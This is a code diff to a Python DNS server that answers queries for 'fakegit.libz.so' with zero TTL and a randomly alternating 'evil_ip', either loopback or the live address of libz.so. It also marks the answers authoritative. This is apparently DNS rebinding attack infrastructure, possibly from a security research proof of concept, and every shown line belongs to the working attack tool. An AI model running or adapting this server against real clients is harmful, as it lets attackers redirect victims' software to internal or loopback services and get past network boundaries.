@@ -13,13 +13,15 @@ def addr_to_dns_repr(addr):
     return b''.join(label_to_dns_repr(label) for label in addr.split('.'))
 
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.bind(('', 53))
-
 A_TYPE = 1
 IN_CLASS = 1
 EXPECTED_QUERY = addr_to_dns_repr('fakegit.libz.so.') + struct.pack('>HH', A_TYPE, IN_CLASS)
 TTL = 0
+FAKEGIT_ADDR = socket.gethostbyname('libz.so')
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.bind(('', 53))
 
 while True:
     packet, client_addr = sock.recvfrom(512)
@@ -44,13 +46,14 @@ while True:
     # Respond with an single answer to the first query and nothing else.
     answer_count = int(can_answer)
     # Indicate that this message is a response and copy the "recursion desired" bit from the query.
+    # Also indicate this is an authoritative response for `fakegit.libz.so`.
     # Zero out everything else (in particular, unset the "recursion available" bit).
-    answer_flags = 0b1000_0000_0000_0000 | (flags & 0b0000_0001_0000_0000)
+    answer_flags = 0b1000_0100_0000_0000 | (flags & 0b0000_0001_0000_0000)
     response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)
 
     answer = b''.join([response_header, query])
     if can_answer:
-        evil_ip = '217.10.34.71' if os.urandom(1)[0] % 4 == 0 else '127.0.0.1'
+        evil_ip = '127.0.0.1' if os.urandom(1)[0] % 4 == 0 else FAKEGIT_ADDR
         packed_evil_ip = ipaddress.IPv4Address(evil_ip).packed
         answer += b''.join([
             EXPECTED_QUERY,
